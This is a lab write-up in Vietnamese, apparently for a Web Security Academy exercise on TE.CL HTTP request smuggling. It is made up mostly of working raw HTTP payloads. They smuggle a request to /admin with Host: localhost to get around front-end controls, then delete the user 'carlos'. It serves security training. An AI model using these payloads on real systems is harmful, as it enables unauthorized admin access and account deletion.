# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

## Detect

Payload kiểm tra TE.CL:

```http
POST / HTTP/1.1
Host: 0a56008e0360312980988ab7000800d0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

a0
GET /admin HTTP/1.1
Host: 0a56008e0360312980988ab7000800d0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0
```

Nếu response không đúng kỳ vọng hoặc bị lỗi do `Host` chưa phải `localhost`, thì request đã đi qua nhưng chưa được ghép theo đúng cách.

## Vì sao có thể bypass

Trong TE.CL:

- Front-end đọc theo chunked encoding.
- Back-end chỉ tin `Content-Length`.
- Phần request smuggled bị back-end cắt và chờ request sau ghép nốt.

## Exploit

Sửa request để back-end thấy `Host: localhost`:

```http
POST / HTTP/1.1
Host: 0a56008e0360312980988ab7000800d0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

70
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0
```

Để xóa `carlos`, chỉ cần đổi path:

```http
POST / HTTP/1.1
Host: 0a56008e0360312980988ab7000800d0.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0
```

Điểm mấu chốt là giữ cho front-end tin request chunked, còn back-end lại chỉ đọc đúng phần đã được smuggle bằng `Content-Length`.
